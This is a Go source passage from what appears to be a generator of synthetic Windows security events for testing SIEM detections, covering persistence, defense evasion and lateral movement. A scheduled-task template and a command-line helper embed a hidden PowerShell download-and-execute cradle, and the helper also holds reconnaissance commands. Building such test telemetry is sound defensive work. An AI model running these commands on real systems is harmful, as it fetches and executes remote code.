			name := c.P("service", c.Pick("WinUpdateSvc", "SysMonitorHost", "RemoteSupportSvc"))
			path := c.P("path", `C:\Windows\Temp\`+strings.ToLower(name)+`.exe`)

			e := secEvent(c, "4697", "12289", "Security System Extension", core.AuditSuccess, 3)
			e.User = c.Env.NetBIOS + `\` + user
			e.Message = lines(
				"A service was installed in the system.", "",
				subject(c, user, c.LogonID()), "",
				"Service Information:",
				kv("Service Name", name),
				kv("Service File Name", path),
				kv("Service Type", "0x10"),
				kv("Service Start Type", "3"),
				kv("Service Account", "LocalSystem"),
			)
			e.EventData = map[string]string{
				"subjectUserName": user, "serviceName": name,
				"serviceFileName": path, "serviceType": "0x10",
				"serviceStartType": "3", "serviceAccount": "LocalSystem",
			}
			return winPayload(c, e, core.SevWarning)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "win-4698-scheduled-task", Source: core.SourceWindows,
			Group: "Persistence", Name: "Scheduled task created",
			Desc:     "A scheduled task was registered. The task XML carries the command that will run.",
			EventID:  "4698", Channel: "Security", Severity: core.SevLabelHigh,
			Mitre: []string{"T1053.005"}, Wazuh: []string{"61144"},
			Params: []core.Param{pUser, param("task", "Task name", "auto"), param("command", "Command", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.AdminUser())
			task := c.P("task", c.Pick(`\Microsoft\Windows\UpdateOrchestrator\SysCheck`, `\WinDefendUpdate`, `\OfficeTelemetryAgent`))
			cmd := c.P("command", `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`)

			e := secEvent(c, "4698", "12804", "Other Object Access Events", core.AuditSuccess, 3)
			e.User = c.Env.NetBIOS + `\` + user
			taskXML := fmt.Sprintf(
				`<?xml version="1.0" encoding="UTF-16"?><Task version="1.2"><Triggers>`+
					`<LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>`+
					`<Principals><Principal id="Author"><UserId>S-1-5-18</UserId>`+
					`<RunLevel>HighestAvailable</RunLevel></Principal></Principals>`+
					`<Actions Context="Author"><Exec><Command>%s</Command>`+
					`<Arguments>-nop -w hidden -c "IEX(New-Object Net.WebClient).downloadString('http://%s/p')"</Arguments>`+
					`</Exec></Actions></Task>`, cmd, c.ExternalIP())

			e.Message = lines(
				"A scheduled task was created.", "",
				subject(c, user, c.LogonID()), "",
				kv("Task Name", task),
				kv("Task Content", taskXML),
			)
			e.EventData = map[string]string{
				"subjectUserName": user, "subjectDomainName": c.Env.NetBIOS,
				"taskName": task, "taskContent": taskXML,
			}
			return winPayload(c, e, core.SevWarning)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "win-4657-registry-modified", Source: core.SourceWindows,
			Group: "Persistence", Name: "Registry value modified",
			Desc:     "A registry value was changed. Run keys are the most common persistence target.",
			EventID:  "4657", Channel: "Security", Severity: core.SevLabelMedium,
			Mitre: []string{"T1547.001", "T1112"}, Wazuh: []string{"61140"},
			Params: []core.Param{pUser, param("key", "Registry key", "auto"), param("value", "New value", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			key := c.P("key", `\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`)
			val := c.P("value", `C:\Users\`+user+`\AppData\Roaming\updater.exe`)

			e := secEvent(c, "4657", "12801", "Registry", core.AuditSuccess, 2)
			e.User = c.Env.NetBIOS + `\` + user
			e.Message = lines(
				"A registry value was modified.", "",
				subject(c, user, c.LogonID()), "",
				"Object:",
				kv("Object Name", key),
				kv("Object Value Name", "SecurityUpdate"),
				kv("Handle ID", fmt.Sprintf("0x%s", c.Hex(4))),
				kv("Operation Type", "New registry value created"), "",
				"Process Information:",
				kv("Process ID", fmt.Sprintf("0x%s", c.Hex(4))),
				kv("Process Name", `C:\Windows\System32\reg.exe`), "",
				"Change Information:",
				kv("Old Value Type", "-"),
				kv("Old Value", "-"),
				kv("New Value Type", "REG_SZ"),
				kv("New Value", val),
			)
			e.EventData = map[string]string{
				"subjectUserName": user, "objectName": key,
				"objectValueName": "SecurityUpdate", "newValue": val,
				"newValueType": "REG_SZ", "operationType": "New registry value created",
				"processName": `C:\Windows\System32\reg.exe`,
			}
			return winPayload(c, e, core.SevNotice)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "win-1116-defender-detection", Source: core.SourceWindows,
			Group: "Malware", Name: "Defender detected malware",
			Desc:     "Microsoft Defender Antivirus detected malware or unwanted software on the endpoint.",
			EventID:  "1116", Channel: "Microsoft-Windows-Windows Defender/Operational",
			Severity: core.SevLabelCritical,
			Mitre:    []string{"T1204"}, Wazuh: []string{"62123"},
			Params: []core.Param{pUser, param("threat", "Threat name", "auto"), param("path", "File path", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			threat := c.P("threat", c.Pick(
				"Trojan:Win32/Meterpreter.A", "Behavior:Win32/Mimikatz.A",
				"Ransom:Win32/Conti.A", "HackTool:Win32/Rubeus",
			))
			path := c.P("path", `C:\Users\`+user+`\Downloads\`+c.Pick("invoice.exe", "update.exe", "setup_x64.exe"))

			e := &core.WinEvent{
				EventID: "1116", Channel: "Microsoft-Windows-Windows Defender/Operational",
				Provider: "Microsoft-Windows-Windows Defender",
				ProviderGUID: "{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}",
				Task: "0", TaskName: "None",
				AuditType: core.AuditWarning, Keywords: "0x8000000000000000",
				Computer: c.WinFQDN(), User: c.Env.NetBIOS + `\` + user,
				Criticality: 4, RecordID: c.Int(1000, 99999),
				ProcessID: c.Int(500, 9000), ThreadID: c.Int(1000, 9000),
			}
			e.Message = lines(
				"Microsoft Defender Antivirus has detected malware or other potentially unwanted software.",
				kv("Name", threat),
				kv("ID", fmt.Sprint(c.Int(2147500000, 2147599999))),
				kv("Severity", "Severe"),
				kv("Category", "Trojan"),
				kv("Path", "file:_"+path),
				kv("Detection Origin", "Local machine"),
				kv("Detection Type", "Concrete"),
				kv("Detection Source", "Real-Time Protection"),
				kv("User", c.Env.NetBIOS+`\`+user),
				kv("Process Name", `C:\Windows\explorer.exe`),
				kv("Action", "Quarantine"),
			)
			e.EventData = map[string]string{
				"threatName": threat, "severityName": "Severe",
				"categoryName": "Trojan", "path": "file:_" + path,
				"detectionUser": c.Env.NetBIOS + `\` + user,
				"processName":   `C:\Windows\explorer.exe`, "actionName": "Quarantine",
			}
			return winPayload(c, e, core.SevErr)
		},
	})
}

// ---------------------------------------------------------------------------
// Defense evasion
// ---------------------------------------------------------------------------

func registerWindowsDefenseEvasion() {
	Register(core.Definition{
		Control: core.Control{
			ID: "win-1102-log-cleared", Source: core.SourceWindows,
			Group: "Defense Evasion", Name: "Audit log cleared",
			Desc:     "The Security event log was cleared. There is almost no benign reason for this on a server.",
			EventID:  "1102", Channel: "Security", Severity: core.SevLabelCritical,
			Mitre: []string{"T1070.001"}, Wazuh: []string{"60137"},
			Params: []core.Param{pUser},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.AdminUser())
			e := &core.WinEvent{
				EventID: "1102", Channel: "Security",
				Provider: "Microsoft-Windows-Eventlog",
				ProviderGUID: "{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}",
				Task: "104", TaskName: "Log clear",
				AuditType: core.AuditInfo, Keywords: "0x4020000000000000",
				Computer: c.WinFQDN(), User: c.Env.NetBIOS + `\` + user,
				Criticality: 4, RecordID: c.Int(100000, 999999),
				ProcessID: c.Int(500, 900), ThreadID: c.Int(1000, 9000),
			}
			e.Message = lines(
				"The audit log was cleared.",
				kv("Subject", ""),
				kv("Security ID", c.UserSID(user)),
				kv("Account Name", user),
				kv("Domain Name", c.Env.NetBIOS),
				kv("Logon ID", c.LogonID()),
			)
			e.EventData = map[string]string{
				"subjectUserName": user, "subjectDomainName": c.Env.NetBIOS,
				"subjectUserSid": c.UserSID(user),
			}
			return winPayload(c, e, core.SevCrit)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "win-4719-audit-policy-changed", Source: core.SourceWindows,
			Group: "Defense Evasion", Name: "System audit policy changed",
			Desc:     "An audit subcategory was reconfigured, typically to stop a category being logged at all.",
			EventID:  "4719", Channel: "Security", Severity: core.SevLabelHigh,
			Mitre: []string{"T1562.002"}, Wazuh: []string{"60112"},
			Params: []core.Param{pUser, param("subcategory", "Subcategory", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.AdminUser())
			sub := c.P("subcategory", c.Pick("Logon", "Process Creation", "Credential Validation", "Security Group Management"))

			e := secEvent(c, "4719", "13568", "Audit Policy Change", core.AuditSuccess, 3)
			e.User = c.Env.NetBIOS + `\` + user
			e.Message = lines(
				"System audit policy was changed.", "",
				subject(c, user, c.LogonID()), "",
				"Audit Policy Change:",
				kv("Category", "Logon/Logoff"),
				kv("Subcategory", sub),
				kv("Subcategory GUID", c.GUID()),
				kv("Changes", "Success removed, Failure removed"),
			)
			e.EventData = map[string]string{
				"subjectUserName": user, "subjectDomainName": c.Env.NetBIOS,
				"categoryId": "Logon/Logoff", "subcategoryId": sub,
				"auditPolicyChanges": "Success removed, Failure removed",
			}
			return winPayload(c, e, core.SevWarning)
		},
	})
}

// ---------------------------------------------------------------------------
// Lateral movement
// ---------------------------------------------------------------------------

func registerWindowsLateral() {
	Register(core.Definition{
		Control: core.Control{
			ID: "win-5140-share-access", Source: core.SourceWindows,
			Group: "Lateral Movement", Name: "Network share accessed",
			Desc:     "A network share was accessed. Access to ADMIN$ or C$ is a strong lateral movement indicator.",
			EventID:  "5140", Channel: "Security", Severity: core.SevLabelMedium,
			Mitre: []string{"T1021.002"}, Wazuh: []string{"60148"},
			Params: []core.Param{pUser, pSrcIP, param("share", "Share name", `\\*\ADMIN$`)},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.AdminUser())
			ip := c.P("srcip", c.InternalIP())
			share := c.P("share", c.Pick(`\\*\ADMIN$`, `\\*\C$`, `\\*\IPC$`))

			e := secEvent(c, "5140", "12808", "File Share", core.AuditSuccess, 2)
			e.User = c.Env.NetBIOS + `\` + user
			e.Message = lines(
				"A network share object was accessed.", "",
				subject(c, user, c.LogonID()), "",
				"Network Information:",
				kv("Object Type", "File"),
				kv("Source Address", ip),
				kv("Source Port", fmt.Sprint(c.EphemeralPort())), "",
				"Share Information:",
				kv("Share Name", share),
				kv("Share Path", `\??\C:\Windows`), "",
				"Access Request Information:",
				kv("Access Mask", "0x1"),
				kv("Accesses", "ReadData (or ListDirectory)"),
			)
			e.EventData = map[string]string{
				"subjectUserName": user, "subjectDomainName": c.Env.NetBIOS,
				"ipAddress": ip, "shareName": share,
				"shareLocalPath": `\??\C:\Windows`, "accessMask": "0x1",
			}
			return winPayload(c, e, core.SevNotice)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "win-5145-share-file-access", Source: core.SourceWindows,
			Group: "Lateral Movement", Name: "Detailed file share access",
			Desc:     "A specific file on a share was accessed. Requests for SYSVOL scripts or NTDS files stand out here.",
			EventID:  "5145", Channel: "Security", Severity: core.SevLabelMedium,
			Mitre: []string{"T1021.002"}, Wazuh: []string{"60149"},
			Params: []core.Param{pUser, pSrcIP, param("file", "Relative file path", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			ip := c.P("srcip", c.InternalIP())
			file := c.P("file", c.Pick("PsExec.exe", "NTDS.dit", "scripts\\logon.bat", "Temp\\payload.dll"))

			e := secEvent(c, "5145", "12811", "Detailed File Share", core.AuditSuccess, 2)
			e.User = c.Env.NetBIOS + `\` + user
			e.Message = lines(
				"A network share object was checked to see whether client can be granted desired access.", "",
				subject(c, user, c.LogonID()), "",
				"Network Information:",
				kv("Object Type", "File"),
				kv("Source Address", ip),
				kv("Source Port", fmt.Sprint(c.EphemeralPort())), "",
				"Share Information:",
				kv("Share Name", `\\*\ADMIN$`),
				kv("Share Path", `\??\C:\Windows`),
				kv("Relative Target Name", file), "",
				"Access Request Information:",
				kv("Access Mask", "0x100081"),
				kv("Accesses", "ReadData (or ListDirectory) ReadAttributes"),
			)
			e.EventData = map[string]string{
				"subjectUserName": user, "ipAddress": ip,
				"shareName": `\\*\ADMIN$`, "relativeTargetName": file,
				"accessMask": "0x100081",
			}
			return winPayload(c, e, core.SevNotice)
		},
	})
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// defaultCmdline gives each sample binary a command line that matches how an
// operator would actually invoke it.
func defaultCmdline(proc string) string {
	switch {
	case strings.HasSuffix(strings.ToLower(proc), "powershell.exe"):
		return `powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).downloadString('http://127.0.0.1/a')"`
	case strings.HasSuffix(strings.ToLower(proc), "net.exe"):
		return `net.exe group "Domain Admins" /domain`
	case strings.HasSuffix(strings.ToLower(proc), "whoami.exe"):
		return `whoami.exe /all`
	default:
		return `cmd.exe /c whoami & net user & ipconfig /all`
	}
}

// dn renders a DNS domain as an LDAP distinguished name.
func dn(domain string) string {
	parts := strings.Split(strings.ToLower(domain), ".")
	for i, p := range parts {
		parts[i] = "DC=" + p
	}
	return strings.Join(parts, ",")
}

// slug turns a control name into an ID fragment.
func slug(name string) string {
	var b strings.Builder
	for _, r := range strings.ToLower(name) {
		switch {
		case r >= 'a' && r <= 'z', r >= '0' && r <= '9':
			b.WriteRune(r)
		case r == ' ':
			b.WriteByte('-')
		}
	}
	return b.String()
}
